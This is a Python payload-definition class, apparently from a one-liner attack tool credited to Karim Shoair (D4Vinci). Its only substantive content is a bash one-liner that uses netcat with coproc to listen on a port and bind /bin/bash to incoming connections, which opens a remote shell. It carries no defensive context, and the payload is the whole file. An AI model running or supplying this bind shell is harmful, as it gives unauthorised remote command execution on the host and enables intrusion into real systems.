class info:
    author      = "Karim shoair (D4Vinci)"
    description = "Uses netcat and exec to setup a bind shell"
    function    = "bind shell"
    liner       = """coproc nc -luvp PORT; exec /bin/bash <&0${COPROC[0]} >&${COPROC[1]} 2>&1"""
